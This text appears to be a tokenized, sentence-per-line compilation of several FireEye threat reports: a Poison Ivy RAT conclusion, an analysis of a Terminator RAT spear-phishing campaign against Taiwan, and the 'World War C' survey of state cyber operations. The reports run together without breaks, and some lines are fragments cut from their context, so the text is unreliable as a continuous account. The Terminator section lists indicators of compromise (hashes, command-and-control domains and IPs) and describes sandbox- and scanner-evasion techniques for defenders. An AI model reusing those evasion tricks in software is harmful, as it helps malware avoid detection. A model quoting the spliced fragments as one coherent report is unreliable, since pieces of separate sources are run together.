But possible explanations include PIVY 's easy - to - use features and the relative anonymity that an off - the - shelf RAT provides for attackers .
Compared to other RATs , PIVY is very easy to operate .
Its graphical user interface ( GUI ) makes building new servers and controlling infected targets simple .
Attackers can point and click their way through a compromised network and exfiltrate data .
Commodity RATs also complicate efforts by security professionals to correlate a threat actor 's activity over time - attackers can hide in the sea of malicious activity that also uses Poison Ivy - based malware .
By exposing the role of PIVY and other commodity RATs in APT campaigns we hope to complicate attackers ' ability to hide behind these off - the - shelf tools - and perhaps force them away from using these RATs .
In this report , we have provided several techniques that network defenders can use to not only identify a PIVY infection , but also classify and correlate detected infections to previously observed APT activity .
In the process of building their PIVY servers , attackers leave a number of potentially useful clues , such as : • The domains and IPs used for CnC • The chosen PIVY process mutex • The chosen PIVY password • Launcher code used in the droppers • Timeline of activity • Targets of attack Together , all of these data points can help effectively identify and correlate APT activity that uses the Poison Ivy RAT .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
Earlier , we documented changes to Aumlib , the malware used in the attack against the New York Times , and Taidoor , a malware family that is being used in ongoing cyber - espionage campaigns particularly against entities in Taiwan .
In this post we will explore changes made to Terminator RAT ( Remote Access Tool ) by examining a recent attack against entities in Taiwan .
We recently analyzed a sample that we suspect was sent via spear - phishing emails to targets in Taiwan .
As shown in Figure 1 , the adversary sends a malicious Word document , `` 103.doc '' ( md5 : a130b2e578d82409021b3c9ceda657b7 ) , that exploits CVE-2012 - 0158 , which subsequently drops a malware installer named `` DW20.exe '' .
This particular malware is interesting because of the following : It evades sandbox by terminating and removing itself ( DW20.exe ) after installing .
Malicious behavior will only appear after reboot .
It deters single - object based sandbox by segregation of roles between collaborating malwares .
The RAT ( svchost_.exe ) will collaborate with its relay ( sss.exe ) to communicate with the command and control server .
It deters forensics investigation by changing the startup location .
It deters file - based scanning that implements a maximum file size filter , by expanding the size of svchost_.exe to 40 MB .
The ultimate payload of the attack is Terminator RAT , which is also known as FakeM RAT .
This RAT does not appear to be exclusively used by a single APT actor , but is most likely being used in a variety ( of possibly otherwise unrelated ) campaigns .
In the past , this RAT has been used against Tibetan and Uyghur activists , and we are seeing an increasing number of attacks targeting Taiwan as well .
However , these attacks use some evasive tactics that demonstrate the evolution of Terminator RAT .
First , the attackers have included a component that relays traffic between the malware and a proxy server .
Second , they have modified the 32-byte magic header that in previous versions attempted to disguise itself to look like either MSN Messenger , Yahoo ! Messenger , or HTML code .
These modifications appear to be an attempt to evade network defenses , perhaps in response to defender 's increasing knowledge of the indicators of compromise associated with this malware .
We will discuss the individual components of this attack in more detail .
It will first create its working folders located at `` % UserProfile % \Microsoft '' and `` % AppData % \2019 '' .
The former is used to store the configurations and executable files ( svchost_.exe and sss.exe ) and the latter is used to store the shortcut link files .
This folder `` 2019 '' was then configured to be the new start up folder location by changing the registry '' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup '' with the location of its path ( see Figure 2 ) .
The executable file `` sss.exe '' was found to be the decrypted form of the resource named 140 with type `` ACCELORATOR '' ( likely misspelling of Accelerator – see Figure 3 ) .
This resource was decrypted using customized XTEA algorithm and appended with an encrypted configuration for the domains and ports .
After installation , DW20.exe deletes and terminates itself .
The malwares will only run after reboot .
This is one effective way to evade sandbox automatic analysis , as malicious activity will only reveal after a reboot .
As a researcher would analyze it independently , it is not considered a malicious program .
This component plays the role as a network relay between the malware and the proxy server , by listening over port 8000 .
To achieve this , it first tries to identify the list of proxy servers that are used within the system using '' WinHttpGetIEProxyConfigForCurrentUser '' , and the discovered proxy servers and related ports are stored in the same directory in a file named `` PROXY '' ( see Figure 4 ) .
When there is a new incoming TCP connection over port 8000 , it will attempt to create a local to proxy socket connection .
With that , it will check connectivity with the CnC server .
If the response is 200 , it will then start to create a `` relay link '' between the malware and the CnC server ( see Figure 5 ) .
The `` relay link '' was created using two threads , where one thread will transfer data from socket 1 to socket 2 ( see Figure 6 ) and the other will do vice versa .
As depicted in Figure 7 , the user agent is hard coded .
It is a possible means to identify potentially malicious traffic , as Internet Explorer 6 is significantly outdated and `` MSIE 6.0.1.3 '' is not a valid version token .
The configurations for the malicious domains and ports to use are located at the last 188 bytes of the executable file ( see Figure 8 ) .
The first 16 bytes is the key ( boxed in red ) to decrypt the remaining content using modified XTEA algorithm ( see Figure 9 ) .
The two malicious domains found were `` liumingzhen.zapto.org '' and `` liumingzhen.myftp.org '' The Terminator sample we analyzed , `` 103.doc '' ( md5 : a130b2e578d82409021b3c9ceda657b7 ) was not configured with fake HTML , Yahoo Messenger , or Windows Messenger traffic header as it had in past variants .
However , the content is encrypted in exactly the same way as previous versions of Terminator RAT .
The decrypted content reveals that the malware is sending back the user name , the computer name and a campaign mark of `` zjz1020 '' .
This particular sample is configured to one of two command and control servers : liumingzhen.zapto.org / 123.51.208.69 liumingzhen.myftp.org / 123.51.208.69 We have located another malicious document that has a Taiwan - related decoy document that drops this same version of Terminator RAT .
The sample we analyzed ( md5 : 50d5e73ff8a0693ed2ee2d320af3b304 ) exploits CVE-2012 - 0158 and has the following command and control server : catlovers.25u.com / 123.51.208.142 The command and control servers for both samples resolved to IP addresses in the same class C network .
In June 2013 , we investigated an attack against entities in Taiwan that used spear - phishing emails to deliver a malicious attachment .
The malicious attachment `` 標案資料.doc '' ( md5 : bfc96694731f3cf39bcad6e0716c5746 ) exploited a vulnerability in Microsoft Office ( CVE-2012 - 0158 ) , however , the payload in this case was a different malware family known as WinData .
The malware connected to the same command and control server , liumingzhen.zapto.org , but the callback is quite different : XYZ /WinData . DLL ? HELO - STX-1 * 1 [ IP Address ] * [ Computer Name ] * 0605 [ MAC : [ Mac Address ] ] $ In a separate case where liumingzhen.zapto.org has been used as the command and control server , the payload was neither WinData nor Terminator RAT , but another type of malware known as Protux .
The sample we analyzed in August 2012 for this case was `` 幹 ! .doc
This particular threat actor has access to a variety of malware families and has been using them to target entities in Taiwan for more than a year .
Terminator RAT is an example of how malware are increasingly becoming more sophisticated and harder to detect .
There is a need for continual research to understand various techniques , tactics , and procedures used by the adversaries .
Detection of exploitation and identification of anomalous callbacks are becoming extremely critical in preventing the malware from installing into the system or phoning back to the command control servers .
This entry was posted in Advanced Malware , Targeted Attack , Threat Intelligence , Threat Research by Geok Meng Ong , Nart Villeneuve and Chong Rong Hwa .
Bookmark the permalink .
Cyberspace has become a full - blown war zone as governments across the globe clash for digital supremacy in a new , mostly invisible theater of operations .
Once limited to opportunistic criminals , cyber attacks are becoming a key weapon for governments seeking to defend national sovereignty and project national power .
From strategic cyber espionage campaigns , such as Moonlight Maze and Titan Rain , to the destructive , such as military cyber strikes on Georgia and Iran , human and international conflicts are entering a new phase in their long histories .
In this shadowy battlefield , victories are fought with bits instead of bullets , malware instead of militias , and botnets instead of bombs .
These covert assaults are largely unseen by the public .
Unlike the wars of yesteryear , this cyber war produces no dramatic images of exploding warheads , crumbled buildings , or fleeing civilians .
But the list of casualties - which already includes some of the biggest names in technology , financial services , defense , and government -is growing larger by the day .
A cyber attack is best understood not as an end in itself , but as a potentially powerful means to a wide variety of political , military , and economic goals .
The relationship between the means chosen and their goals will look rational and reasonable to them if not necessarily to us .
This report describes the unique characteristics of cyber attack campaigns waged by governments worldwide .
We hope that , armed with this knowledge , security professionals can better identify their attackers and tailor their defenses accordingly .
Here is a quick overview : • Asia - Pacific .
Home to large , bureaucratic hacker groups such as the `` Comment Crew '' who pursue many goals and targets in high - frequency , brute - force attacks .
These cyber attacks are more technically advanced and highly effective at evading detection .
These hackers are dynamic , often using creativity , deception , and social engineering to trick users into compromising their own computers .
The most complex , targeted , and rigorously engineered cyber attack campaigns to date .
World War Z - a bestselling book and Hollywood movie - detailed a global pandemic in which politics and culture deeply influenced how the public - and by extension , governments - reacted to a zombie plague .
In one passage , for example , an Arab boy refused to believe that the disease was real , suspecting that Israel had fabricated the story .
The nations described in World War Z - the United States , China , Russia , South Korea , Israel , and many others - are involved in a very different type of conflict , but one with real and growing national security impact : World War C , where `` C '' stands for `` Cyber '' .
However , the same rule applies : each country has a unique political system , history , language , culture , and understanding of human and international conflict .
Cyber conflict often mirrors traditional conflict .
For example , China uses high - volume cyber attacks similar to how it used infantry during the Korean War .
Many Chinese soldiers were sent into battle with only a handful of bullets .
Given their strength in numbers , they were still able to achieve battlefield victories .
On the other end of the spectrum lie Russia , the U.S. , and Israel , whose cyber tactics are more surgical , reliant on advanced technologies and the cutting - edge work of contractors who are driven by competition and financial incentives .
We are still at the dawn of the Internet Age .
But cyber attacks have already proven themselves as a low - cost , high - payoff way to defend national sovereignty and to project national power .
Many of today 's headlines seem to be pulled from the pages of a science fiction novel .
Code so sophisticated it destroys a nuclear centrifuge thousands of miles away .
Malware that secretly records everything a user does on a computer .
A software program that steals data from any nearby device that has Bluetooth connectivity .
Encrypted code that decrypts only on one specific , target device .
Such sophistication speaks volumes about the maturity , size , and resources of the organizations behind these attacks .
With a few rare exceptions , these attacks are now in the exclusive realm of nation - states .
Naval War College , in an email interview .
Attribution determinations made without sensitivity to the geopolitical surroundings are seldom reasonable .
Cyber war has been compared to special operations forces , submarine warfare , missiles , assassins , nuclear weapons , Pearl Harbor , 9/11 , Katrina , and more .
Even our zombie analogy is not new .
Often , any compromised computer , if it is actively under the surreptitious control of a cybercriminal , is called a zombie , and botnets are sometimes called zombie armies .
Also , compared to stockpiling tanks and artillery , writing cyber attack code , and compromising thousands if not millions of computers , is easy .
Moreover , malware often spreads with the exponential growth of an infectious disease .
This report examines many publicly known cyber attacks .
By exploring some of the distinctive national or regional characteristics of these attacks , organizations can better identify their attackers , anticipate future attacks , and defend themselves .
The analytical waters surrounding cyber warfare are inherently murky .
At the strategic level , governments desire to have a degree of plausible deniability .
At the tactical level , military and intelligence organizations envelop such operations in layers of classification and secrecy .
To be effective , information operations rely on deception - and the Internet offers an ideal venue for a spy 's smoke and mirrors .
In practical terms , hackers often run their attacks through cyber terrain ( such as compromised , third - party networks ) that present investigators with technical and jurisdictional complications .
And finally , cybercriminal tools , tactics , and procedures ( TTPs ) evolve so quickly that cyber defense , legislation , and law enforcement remain behind the attacker 's curve .
But computer viruses , worms , and denial of service attacks often emanate from behind a veil of anonymity .
The best chance to pierce this veil comes with the skillful blending of forensic back - hacking techniques with deep knowledge of others ' strategic cultures and their geopolitical aims .
States are often mistakenly identified as non - state actors , and vice versa .
To make matters worse , ties between the two are increasing .
First , a growing number of `` patriotic cybercriminals '' ostensibly wage cyber war on behalf of governments ( examples include Chechnya and Kosovo in the 1990s , China in 2001 , Estonia in 2007 , Georgia in 2008 , and every year in the Middle East ) .
Second , cybercrime organizations offer anyone , including governments , cyber attack services to include denial - of - service attacks and access to previously compromised networks .
Thus , some cyber attack campaigns may bear the hallmarks of both state and non - state actors , making positive attribution almost impossible .
And finally , `` false flag '' cyber operations involve a hacker group behaving like another to mislead cyber defense researchers .
Within the shadowy world of cyber warfare , FireEye occupies a unique position .
First , our threat protection platform has been installed on thousands of sensitive networks around the world .
This gives our researchers a global and embedded presence in the cyber domain .
Second , FireEye devices are placed behind traditional security defenses such as firewalls , anti - virus , and intrusion prevention systems .
This means that our `` false positive '' rate is extremely low , and that the attacks we detect have already succeeded in penetrating external network defenses .
The People 's Republic of China is the noisiest threat actor in cyberspace .
The reasons for this include its huge population , a rapidly expanding economy , and a lack of good mitigation strategies on the part of its targets .
The list of successful Chinese compromises is long , and spans the entire globe .
Here are some of the most significant incidents in the U.S. : • Government : By 1999 , the U.S. Department of Energy believed that China posed an `` acute '' threat to U.S. nuclear security via cyber espionage .
By 2009 , China apparently stole the plans for the most advanced U.S. fighter jet , the F-35 .
Some of these cyber attacks have given China access to proprietary information such as research and development data .
Others offer Chinese intelligence access to sensitive communications , from senior government officials to Chinese political dissidents .
Of course , the U.S. is not China 's only cyber target .
All traditional , geopolitical conflicts have moved into cyberspace , and Chinese compromises encompass the entire globe .
But many contests have been one - sided affairs , with all publicly known attacks emanating from China .
One expert confided that an exclusive reliance on Chinese hardware might give China a `` permanent '' denial - of - service capability .
One sophisticated attack on an Indian Navy headquarters allegedly used a USB vector to bridge the `` air - gap '' between a compartmentalized , standalone network and the Internet .
Chinese cybercriminals have even stolen classified documents .
In 2010 , a Chinese telecommunications firm transmitted erroneous routing information for 37,000 computer networks , which misrouted some Internet traffic through China for 20 minutes .
The attack exposed data from 8,000 U.S. networks , 1,100 Australian networks , and 230 French networks .
The People 's Republic of China ( PRC ) is home to 1.35 billion people , or more than four times the population of the United States .
Therefore , China often has the ability to overwhelm cyber defenses with quantity over quality , just as it did in the Korean War and as it might do in any other type of conflict .
The Chinese malware that FireEye researchers have analyzed is not the most advanced or creative .
But in many circumstances , it has been no less effective .
China employs brute - force attacks that are often the most inexpensive way to accomplish its objectives .
The attacks succeed due to the sheer volume of attacks , the prevalence and persistence of vulnerabilities in modern networks , and a seeming indifference on the part of the cybercriminals to being caught .
The `` Comment Crew , '' a prominent example of a Chinese cyber threat actor , is believed to be a contractor to the PRC government .
The Comment Crew is behind many noteworthy attacks , including Operation Beebus , which targets U.S. aerospace and defense industries .
One important characteristic of the Comment Crew - which puts it definitively in the category of an advanced persistent threat , or APT - is that it is a bureaucracy .
In - depth analysis reveals a small group of creative and strategic thinkers at the top .
One layer down , a larger group of specialists design and produce malware in an industrial fashion .
At the bottom are the foot soldiers - brute - force hackers who execute orders and wage extended cyber attack campaigns , from network reconnaissance to spear phishing to data exfiltration .
The Comment Crew is so large , in fact , that when the Federal Bureau of Investigation ( FBI ) decoded one of the group 's stolen caches of information , if printed out , it would have created a stack of paper taller than a set of encyclopedias .
Such a large bureaucracy helps to explain sometimes - incongruous cybercriminal behavior .
A given piece of malware , for example , may have been written by an expert but incorrectly used later by an inexperienced foot soldier ( such as a poorly written spear phishing email ) .
Understanding this cyber attack life cycle and its different stages can help cyber defenders recognize and foil an attack .
In any large organization , some processes are less mature than others , and therefore easier to recognize .
In its own defense , Chinese officials contend that their country is also a target of cyber attacks .
In 2006 , the China Aerospace Science & Industry Corporation ( CASIC ) found spyware on its classified network .
In 2007 , the Chinese Ministry of State Security stated that foreign cybercriminals were stealing Chinese information , with 42 percent of attacks coming from Taiwan and 25 percent from the United States .
In 2009 , Chinese Prime Minister Wen Jiabao announced that a cybercriminal from Taiwan had stolen his upcoming report to the National People 's Congress .
In 2013 , Edward Snowden , a former system administrator at the National Security Agency ( NSA ) , published documents suggesting that the U.S. conducted cyber espionage against China ; and the Chinese Computer Emergency Response Team ( CERT ) stated that it possessed `` mountains of data '' on cyber attacks by the U.S. North and South Korea remain locked in one of the most intractable conflicts on Earth .
North Korea ( supported by China ) would seem to be stuck in a cyber Stone Age - especially relative to South Korea ( supported by the U.S. ) -has the fastest download speeds in the world and will issue its students with computer tablets instead of books by 2015 .
Even so , the Internet offers anyone , and any nation , an asymmetric way to gather intelligence and project national power in cyberspace - and North Korea appears to have acquired cyber attacks as a new weapon for its arsenal .
In 2009 , North Korea launched its first major assault on South Korean and U.S. government websites .
The attack did little damage , but the incident gained wide media exposure .
By 2013 , however , the threat actors had matured .
A group dubbed the `` DarkSeoul Gang '' was responsible for at least four years of high - profile attacks on South Korea .
The group 's attacks included a distributed denial - of - service ( DDoS ) attack and malicious code that wiped computer hard drives at banks , media , ISPs , telcos , and financial services companies - overwriting legitimate data with political messages .
In the Korean conflict , such incidents often take place on dates of historical significance , including July 4 , the U.S .
Independence Day .
Suspected North Korean attacks on U.S. institutions include U.S. military elements based in South Korea , the U.S .- based Committee for Human Rights in North Korea , and even the White House .
North Korean defectors have described a burgeoning cyberwarfare department of 3,000 personnel , largely trained in China and Russia .
The defectors stressed that North Korea has a growing fascinationwith cyber attacks as a cost - effective way to compete against its conventionally superior foes .
They believe that North Korea is growing increasingly comfortable and confident in this new warfare domain , assessing that the Internet is not only vulnerable to attack but that this strategy can create psychological pressure on the West .
Toward this end , North Korea has focused on disconnecting its important servers from the Internet , while building a dedicated `` attack network .
Some North Korean attacks have begun to manipulate a victim 's operating system settings and disable their anti - virus software- techniques that are normally characteristic of Russian cybercriminals .
In other words , North Korean hackers may have learned from or have contracted support in Russia .
Apart from any possible disruption or destruction stemming from cyber attacks , computer network operations are an invaluable tool for collecting sensitive information , especially when it resides on government or think - tank networks normally inaccessible from the Internet .
North Korea , China , and Russia are all naturally interested in collecting cyber intelligence that would increase their comparative advantage in classified information , diplomatic negotiating positions , or future policy changes .
At the same time , North Korea also asserts that it is a target of cyber attacks from South Korea and the U.S .
In June 2013 , when the North suffered a two - day outage of all of its in - country websites , its state news agency denounced `` concentrated and persistent virus attacks , '' and proclaimed that the U.S. and South Korea `` will have to take the responsibility for the whole consequences .
A heavily fortified border separates India and Pakistan on the map .
But the quiet , borderless nature of cyberspace means both sides are free to engage in cyber warfare - even during peacetime .
In 2009 , India announced that Pakistani cybercriminals had placed malware on popular Indian music download sites as a clever , indirect way to compromise Indian systems .
In 2010 , the `` Pakistani Cyber Army '' defaced and subsequently shut down the website of the Central Bureau of Investigation , India 's top police agency .
In 2012 , over 100 Indian government websites were compromised .
Not to be outdone , in 2013 , cybercriminals in India undertook `` Operation Hangover , '' a large - scale Indian cyber espionage campaign that hit Pakistani IT , mining , automotive , legal , engineering , food service , military , and financial services networks .
Although researchers could not definitively tie the attacks to India 's government , many of the targets represented the country 's national security interests .
Since at least 2010 , many APTs ( likely China - based ) have targeted the governments , militaries , and businesses of ASEAN , the Southeast Asian geopolitical and economic group composed of Brunei , Burma ( Myanmar ) , Cambodia , Indonesia , Laos , Malaysia , Philippines , Singapore , Thailand , and Vietnam .
Although chances of any regional war erupting in the near term are low , a large volume of ongoing , regional cyber espionage activity is a constant .
Targeted industries include telecommunications , transportation , oil and gas , banks , and think tanks .
The usual motivation is to gain tactical or strategic advantage within the political , military , and economic domains .
Their most common tactic is spear phishing , often using legitimate decoy documents that are related to the target 's national economy or politics , or to regional events such as ASEAN summits , Asia - Pacific Economic Cooperation ( APEC ) summits , energy exploration , or military affairs .
Often , these organizations have inconsistent system administration , infrequent software patch management , poor policy control , or some combination of these issues .
Thus , many of these networks are `` low - hanging fruit '' for attackers .
And to make matters worse , compromised systems are used as staging grounds for further attacks on regional targets , by installing illicit command - and - control ( CnC ) servers , abusing legitimate email accounts , and disseminating stolen office documents as `` bait .
Seven decades later , cyber defense researchers would say that not much has changed .
Compared with the constant attacks detected from China , you can almost hear the snow falling on Red Square .
One of the outstanding questions in cyber security today is : Where are the Russians ? Perhaps they are simply great hackers .
Maybe they have sufficient human intelligence .
Whatever the reason , cyber defense analysts often look in vain for the traces of Russian cybercriminals .
As a step toward finding some answers , however , consider the second half of Churchill 's quote : `` … but perhaps there is a key- that key is Russian national interest .
In the mid-1990s , at the very dawn of the World Wide Web , Russia was engaged in a protracted struggle over the fate of Chechnya ; the Chechens became pioneers in cyber propaganda , and the Russians became pioneers is shutting down their websites .
In 1998 , when Russian ally Serbia was under attack from NATO , pro - Serbian hackers jumped in the fray , targeting NATO with DoS attacks and at least twenty - five strains of virus - infected email .
In 2007 , Russia was the prime suspect in the most famous international cyber attack to date - the punitive DDoS on Estonia for moving a Soviet - era statue .
In 2008 , researchers uncovered clear evidence that computer network operations played a supporting role in Russian military advances during its invasion of Georgia .
Also in 2008 , Russia was suspected in what U.S. Deputy Secretary of Defense William Lynn called the `` most significant breach of U.S. military computers ever '' -an attack on Central Command ( CENTCOM ) , delivered through an infected USB drive .
In 2009 , Russian cybercriminals were blamed in `` Climategate , '' a breach of university research intended to undermine international negotiations on climate change mitigation .
In 2010 , NATO and the European Union warned of increased Russian cyber attacks , while the FBI arrested and deported a possible Russian intelligence agent named Alexey Karetnikov , who had been working as a software tester at Microsoft .
One ironic aspect of nation - state cyber attacks - especially in authoritarian countries - is that many of them are inward facing .
In 2012 , Russian security firm Kaspersky Lab announced the discovery of '' Red October , '' a cyber attack campaign that spied on millions of citizens around the world , but chiefly within the former Soviet Union .
Targets included embassies , research firms , military bases , energy providers , nuclear agencies , and critical infrastructure .
Similarly , in 2013 , researchers found malware on millions of Android devices in Russia and in Russian - speaking countries .
Either or both of these attacks could be partially explained as the Russian government keeping an eye on its own population , and that of neighboring countries .
On the brighter side , as a step toward cyber détente , the U.S. and Russia in 2013 signed an agreement to build a cyber `` hotline '' -similar to that used for nuclear scares during the Cold War - to help defuse any computer - related crises in the future .
But , just to be on the safe side , Russia is taking the extreme cyber defense measure of buying old - fashioned typewriters , and the Russian military is ( like the U.S. , China , and Israel ) creating cyber warfare - focused units .
Though relatively quiet , Russia appears to be home to many of the most complex and advanced cyber attacks FireEye researchers have seen .
More specifically , Russian exploit code can be significantly stealthier than its Chinese counterpart - which can also make it more worrisome .
The `` Red October '' campaign , including its satellite software dubbed `` Sputnik , '' is a prominent example of likely Russian malware .
In fact , one telltale aspect of Russian hackers seems to be that , unlike the Chinese , they go to extraordinary lengths to hide their identities and objectives .
One further problem for cyber defense researchers is that some Russian back doors into compromised systems are hard to distinguish from advanced cybercriminal break - ins .
As a region , the Middle East may not possess the arsenal of zero - day exploits available in Russia , or the brute - force numbers of China .
Therefore , some Middle Eastern hackers may have to rely on cyber tactics that emphasize novelty , creativity , and deception .
For example , the 2012 Mahdi campaign , which infected targets in the Middle East , used malicious Word documents , PowerPoint files , and PDFs to infect targets .
That approach is similar to many other attackers .
But these attacks were accompanied by some imaginative elements such as games , attractive images , and custom animations specifically designed to aid in the attack .
Not only did they trick users into executing commands to install malicious code , but they also distracted users from seeing malware - related warning messages .
Furthermore , Mahdi attacks were tailored to specific target audiences - for example by offering variations of games unique to each organization .
Such pinpoint strikes rely on prior reconnaissance , help to evade cyber defense behavioral - detection mechanisms , and dramatically increase the odds of compromise .
So in the Middle East , the relative sophistication of an attack may be calculated less in the technology , and more in the clever ways in which malware is delivered and installed on a target network .
Wherever significant activity erupts in the real world ( including crime , espionage , and warfare ) , parallel activity unfolds in cyberspace .
It is therefore unsurprising that Iran - which has tense international relations and is on the verge of acquiring a nuclear bomb - has also experienced the most sophisticated cyber attacks to date .
In 2010 , Stuxnet was a `` cyber missile '' of sorts designed with painstaking precision to burrow deep into Iran 's nuclear program and destroy physical infrastructure .
To some degree , this piece of software replaced a squadron of fighter aircraft that would have violated foreign airspace , dropped laser- guided bombs , and left a smoking crater in the Earth 's surface .
Beyond Stuxnet , other advanced espionage attacks have worried security experts , including Duqu , Flame , and Gauss , which all may have come from the same threat actor .
And even amateurs are successfully targeting Iran ; although the `` Mahdi '' malware is by comparison far less sophisticated than Stuxnet and its cousins , Mahdi has still managed to compromise engineering firms , government agencies , financial services firms , and academia throughout the Middle East .
So how does anyone , including a nation - state , respond to a cyber attack ? Does the counterstrike remain within the cyber realm , or can it come in the form of a traditional military ( or terrorist ) assault ? In 2012 , Iran appears to have chosen the first option .
A hacker group called the `` Cutting Sword of Justice '' used the `` Shamoon '' virus to attack the Saudi Arabian national oil company Aramco , deleting data on three - quarters of Aramco 's corporate PCs ( including documents , spreadsheets , e - mails , and files ) and replacing them with an image of a burning American flag .
And over the past year , another group called Izz ad - Din al - Qassam launched `` Operation Ababil , '' a series of DDoS attacks against many U.S. financial institutions including the New York Stock Exchange .
Other examples of cyber attacks abound .
In 2009 , the plans for a new U.S. Marine Corps 1 presidential helicopter were found on a file - sharing network in Iran .
In 2010 , the `` Iranian Cyber Army '' disrupted Twitter and the Chinese search engine Baidu , redirecting users to Iranian political messages .
In 2011 , Iranian attackers compromised a Dutch digital certificate authority , after which it issued more than 500 fraudulent certificates for major companies and government agencies .
In 2012 , Iran disrupted the BBC 's Persian Language Service , and University of Toronto researchers reported that some versions of the Simurgh `` proxy '' software ( which is popular in countries like Iran and anonymizes Internet traffic ) also installed a Trojan that collected usernames and keystrokes , sending them to a likely intelligence collection site .
Finally , in 2013 the Wall Street Journal reported that Iranian actors had increased their efforts to compromise U.S. critical infrastructure .
Syria is in the midst of a civil war , so researchers have a lot of cyber activity to analyze .
The most prominent hacker group by far is the Syrian Electronic Army ( SEA ) , which is loyal to Syrian President Bashar al - Assad .
Its most famous exploit was a hoax announcement using AP 's Twitter account that the White House was bombed and President Obama injured - after which stock markets briefly dipped to the tune of $ 200 billion .
In the month of July 2013 alone , SEA compromised three widely used online communications websites : Truecaller ( the world 's largest telephone directory ) , Tango ( a video and text messaging service ) , and Viber ( a free online calling and messaging application ) .
These types of compromises are significant because they can give Syrian intelligence access to the communications of millions of people , including political activists within Syria who might then be targeted for espionage , intimidation , and arrest .
To compromise its targets , the SEA often sends socially engineered , spear - phishing emails to lure opposition activists into opening fraudulent , weaponized , and malicious documents .
If the recipient falls for the scam , Trojan horse , remote access tool ( RAT ) software is installed on the victim 's computer that can give the attacker keystrokes , screenshots , microphone and webcam recordings , stolen documents , and passwords .
And of course , the SEA likely sends all of this information to a computer address lying within Syrian government - controlled Internet Protocol ( IP ) space for intelligence collection and review .
Even during the Cold War , the Arab - Israeli conflict saw many hot wars , and it was often the testing ground for new military weapons and tactics .
Nothing has changed in the Internet era .
Since at least 2000 , pro - Israeli hackers have targeted sites of political and military significance in the Middle East .
In 2007 , Israel reportedly disrupted Syrian air defense networks via cyber attack ( with some collateral damage to its own domestic networks ) to facilitate the Israeli Air Force 's destruction of an alleged Syrian nuclear facility .
But as an advanced industrial nation , Israel also depends on information technology .
The nation has proven to be vulnerable to cyber attacks , which often target the Israeli economy .
In 2009 , during Israel 's military operation in Gaza , hackers briefly paralyzed many government sites with a DDoS attack from at least 500,000 computers .
The 2009 attack consisted of four independent waves , each stronger than the last , peaking at 15 million junk mail deliveries per second .
The Israeli `` Home Front Command '' website , which plays a key role in national defense communications with the public , was down for three hours .
Due to technical similarities with the 2008 cyber attack on Georgia during its war with Russia , Israeli officials surmised that the attack itself might have been carried out by a criminal organization in the former Soviet Union , and paid for by Hamas or Hezbollah .
Often , the trouble with cyber attacks is that they do not need to be highly sophisticated to succeed , even against security - conscious Israel .
In 2012 , the ineptly written `` Mahdi '' malware compromised at least 54 targets in Israel .
Last but not least , in 2013 , the Iranian media reported that the Syrian army had carried out a cyber attack against the water supply of the Israeli city of Haifa .
Prof . Isaac Ben - Israel , a cyber security adviser to Prime Minister Benjamin Netanyahu , said that the report was false , but added that cyber attacks on critical infrastructures pose a `` real and present threat '' to Israel .
Analysts believe that the U.S. has conducted the most highly engineered cyber attacks to date , including Stuxnet , Duqu , Flame , and Gauss .
This family of malware is unparalleled in its complexity and targeting .
Stuxnet in particular was developed with a singular goal ( to disrupt Iranian nuclear enrichment ) that was both narrowly focused and capable of yielding strategic gains in the international arena .
In contrast to computer worms such as Slammer and Code Red , Stuxnet did not seek to compromise as many computers as possible , but as few as possible .
Even more amazing , its malicious behavior was concealed under a veneer of apparently legitimate operational data - but ultimately , the malware destroyed Iranian centrifuges .
This family of malware was exquisitely designed .
For example , its payload can arrive at its destination encrypted - and become decrypted and installed only on a target device .
This helps the malware to evade the prying eyes of cyber defenders , making discovering and reverse engineering the malware much more difficult .
Ironically , this family of malware could be a paragon of over - engineering .
For example , it not only uses multiple zero - day exploits , but also world - first computational achievements such as a forced cryptographic `` hash collision .
So the authors of Stuxnet could likely have used more conventional computer exploits and still succeeded .
One possible telling aspect of U.S. cyber attacks : they require such a high level of financial investment , technical sophistication , and legal oversight that they will stand out from the crowd .
On the last point , Richard Clarke , who served three U.S. Presidents as a senior counterterrorism official , argued that Stuxnet was a U.S. operation because `` it very much had the feel to it of having been written by or governed by a team of Washington lawyers .
On the downside ( and similar to the Israeli case ) , all advanced industrial economies are vulnerable to cyber counterattack .
In 2008 , a CIA official informed a conference of critical infrastructure providers that unknown cybercriminals , on multiple occasions , had been able to disrupt the power supply in various foreign cities .
In the military domain , Iraqi insurgents used $ 26 off - the - shelf software to intercept live video feeds from U.S .
Predator drones , likely giving them the ability to monitor and evade U.S. military operations .
In the economic sphere , the U.S .- based International Monetary Fund ( IMF ) fell victim to a phishing attack in 2011 that was described as a `` very major breach .
As part of a broader effort to mitigate the threat , President Obama signed a directive in 2013 that the U.S. should aid allies who come under foreign cyber attack .
No prominent examples have been discovered of the European Union ( EU ) or the North Atlantic Treaty Organization ( NATO ) conducting their own offensive cyber attacks .
On the contrary , their leaders have so far foresworn them .
But many examples reveal European networks getting hacked from other parts of the world , particularly China and Russia .
Within government , cyber attacks on the British Foreign Ministry evaded network defenses in 2010 by pretending to come from the White House .
In 2011 , German Police found that servers used to locate serious criminals and terrorism suspects had been penetrated , initially via a phishing attack .
Also in 2011 , European Commission officials were targeted at an Internet Governance Forum ( IGF ) in Azerbaijan .
In the military sphere , in 2009 , French Navy planes were grounded following an infection by the Conficker worm .
In 2012 , the UK admitted that cybercriminals had penetrated its classified Ministry of Defense networks .
In business , the European Union 's carbon trading market was breached in 2011 , resulting in the theft of more than $ 7 million in credits , forcing the market to shut down temporarily .
In 2012 , the European Aeronautic Defence and Space Company ( EADS ) and German steelmaker ThyssenKrupp fell victim to major attacks by Chinese cybercriminals .
Security professionals should particularly be on the lookout for APT cyber threats just before and during international negotiations .
In 2011 alone , the European Commission complained of widespread hacking before an EU summit , the French government was compromised prior to a G-20 meeting , and at least 10 Norwegian defense and energy companies were breached during large - scale contract negotiations , via phishing that was specifically tailored to each company .
World War Z told a story of idiosyncratic national behavior in response to a major international crisis .
This report sought to highlight the same phenomenon in regard to the challenges posed by national cyber insecurity and international cyber attacks .
Behind every incident is an agenda - and individual human beings - each unique and ultimately identifiable .
The bigger the cyber campaign , the more data it generates for security researchers , and the more difficulty attackers will have remaining anonymous and hiding their agenda .
